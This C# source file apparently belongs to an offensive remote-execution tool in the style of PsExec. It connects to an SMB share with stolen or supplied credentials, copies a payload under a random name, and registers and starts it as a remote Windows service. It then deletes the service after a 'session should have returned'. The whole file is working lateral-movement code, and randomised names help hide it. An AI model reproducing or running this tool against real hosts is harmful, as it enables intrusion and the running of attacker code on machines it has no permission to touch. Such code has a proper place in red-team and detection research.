using System;
using System.IO;

namespace CSharpExec
{
    internal class ConnectionManager
    {
        public static void Execute(String UNC, String Username, String Password, String FilePath, String Hostname)
        {
            String SvcName = Utils.RandomSvcName();
            String FileName = Utils.RandomSvcName();
            NativeMethods.ShareResponses isDisconnected = disconnectFromShare(UNC);

            Logger.Print(Logger.STATUS.INFO, "Attempting to connect to: " + UNC);
            NativeMethods.ShareResponses isConnected = connectToShare(UNC, Username, Password);
            if (isConnected == NativeMethods.ShareResponses.NO_ERROR)
            {
                Logger.Print(Logger.STATUS.GOOD, "Response from share: " + isConnected.ToString());
                String remoteFilePath = copyFileToServer(UNC, FilePath, FileName);
                if (remoteFilePath != null)
                {
                    IntPtr hServiceCreated = CreateRemoteService(Hostname, SvcName, remoteFilePath);
                    if (hServiceCreated != IntPtr.Zero)
                    {
                        Boolean isStarted = StartRemoteService(hServiceCreated, SvcName);
                        if (isStarted)
                        {
                            Logger.Print(Logger.STATUS.INFO, "Session should have returned, uninstalling " + SvcName);
                            Boolean isDeleted = StopRemoteService(Hostname, SvcName);
                            NativeMethods.CloseHandle(hServiceCreated);
                        }
                    }
                }
                else
                {
                    Logger.Print(Logger.STATUS.ERROR, "File didn't copy, not can't start a service!");
                    Utils.ErrorMsg();
                }
            }
            else
            {
                Utils.ErrorMsg();
            }
            isDisconnected = disconnectFromShare(UNC);
            if (isDisconnected != NativeMethods.ShareResponses.NO_ERROR)
            {
                Utils.ErrorMsg();
            }
        }

        private static NativeMethods.ShareResponses connectToShare(String UNC, String Username, String Password)
        {
            NativeMethods.NETRESOURCE netResource = new NativeMethods.NETRESOURCE();
            netResource.dwType = NativeMethods.ResourceType.DISK;
            netResource.lpRemoteName = UNC;
            NativeMethods.ShareResponses isConnected = NativeMethods.WNetUseConnection(IntPtr.Zero, netResource, Password, Username, 0, null, null, null);
            return isConnected;
        }

        private static NativeMethods.ShareResponses disconnectFromShare(String UNC)
        {
            NativeMethods.ShareResponses isDisconnected = NativeMethods.WNetCancelConnection(UNC, true);
            return isDisconnected;
        }

        private static String copyFileToServer(String UNC, String FilePath, String FileName)
        {
            String FileToCopy = Path.GetFileName(FilePath);
            String remoteFilePath = String.Format("{0}\\{1}", UNC, FileName);
            Logger.Print(Logger.STATUS.INFO, "Copying " + FileToCopy + " to " + remoteFilePath);
            if (File.Exists(remoteFilePath))
            {
                Logger.Print(Logger.STATUS.INFO, FileToCopy + " is already there, deleting it :)");
                File.Delete(remoteFilePath);
            }
            try
            {
                File.Copy(FilePath, remoteFilePath);
                Logger.Print(Logger.STATUS.GOOD, "Copied to " + remoteFilePath);
                if (File.Exists(remoteFilePath))
                {
                    return remoteFilePath;
                }
                else
                {
                    Logger.Print(Logger.STATUS.ERROR, "Copy was successful, but no file was created");
                    return null;
                }
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
                return null;
            }
        }

        private static IntPtr CreateRemoteService(String Hostname, String SvcName, String remoteFilePath)
        {
            IntPtr hCreatedService = IntPtr.Zero;
            Logger.Print(Logger.STATUS.INFO, "Attempting to create service: " + SvcName);
            IntPtr hSCMManager = NativeMethods.OpenSCManager(Hostname, null, NativeMethods.SVCAccessRights.SC_MANAGER_CREATE_SERVICE);
            if (hSCMManager != null)
            {
                Logger.Print(Logger.STATUS.GOOD, "Handle for OpenSCManager obtained: " + hSCMManager.ToInt32());
                hCreatedService = NativeMethods.CreateService
                    (
                        hSCMManager,
                        SvcName,
                        SvcName,
                        NativeMethods.dwDesiredAccess.SERVICE_ALL_ACCESS,
                        NativeMethods.dwServiceType.SERVICE_WIN32_OWN_PROCESS,
                        NativeMethods.dwStartType.SERVICE_AUTO_START,
                        NativeMethods.dwErrorControl.SERVICE_ERROR_NORMAL,
                        remoteFilePath,
                        null,
                        IntPtr.Zero,
                        null,
                        null,
                        null
                    );
                if (hCreatedService != null)
                {
                    Logger.Print(Logger.STATUS.GOOD, "Handle for CreateService obtained: " + hSCMManager.ToInt32());
                    Logger.Print(Logger.STATUS.GOOD, SvcName + " created!");
                    NativeMethods.CloseHandle(hCreatedService);
                }
                else
                {
                    Logger.Print(Logger.STATUS.ERROR, "Failed to get a handle with CreateService");
                    Utils.ErrorMsg();
                    NativeMethods.CloseHandle(hSCMManager);
                }
            }
            else
            {
                Logger.Print(Logger.STATUS.ERROR, "Failed to get a handle with OpenSCManager");
                Utils.ErrorMsg();
            }
            return hCreatedService;
        }

        private static Boolean StartRemoteService(IntPtr hServiceHandle, String SvcName)
        {
            Logger.Print(Logger.STATUS.INFO, "Attempting to start the service...");
            Boolean isStarted = NativeMethods.StartService(hServiceHandle, 0, null);
            if (isStarted)
            {
                Logger.Print(Logger.STATUS.GOOD, SvcName + " was started!");
            }
            else
            {
                Logger.Print(Logger.STATUS.ERROR, SvcName + " was not started!");
                Utils.ErrorMsg();
            }
            NativeMethods.CloseHandle(hServiceHandle);
            return isStarted;
        }

        private static Boolean StopRemoteService(String Hostname, String SvcName)
        {
            Logger.Print(Logger.STATUS.INFO, "Attempting to remove the service...");
            IntPtr hSCMManager = NativeMethods.OpenSCManager(Hostname, null, NativeMethods.SVCAccessRights.SC_MANAGER_CREATE_SERVICE);
            if (hSCMManager != null)
            {
                IntPtr hServiceOpen = NativeMethods.OpenService(hSCMManager, SvcName, NativeMethods.dwDesiredAccess.SERVICE_ALL_ACCESS);
                if (hServiceOpen != null)
                {
                    Boolean isDeleted = NativeMethods.DeleteService(hServiceOpen);
                    if (isDeleted)
                    {
                        Logger.Print(Logger.STATUS.GOOD, SvcName + " was deleted!");
                        return true;
                    }
                    else
                    {
                        Utils.ErrorMsg();
                        return false;
                    }
                }
                else
                {
                    Utils.ErrorMsg();
                    return false;
                }
            }
            else
            {
                Utils.ErrorMsg();
                return false;
            }
        }
    }
}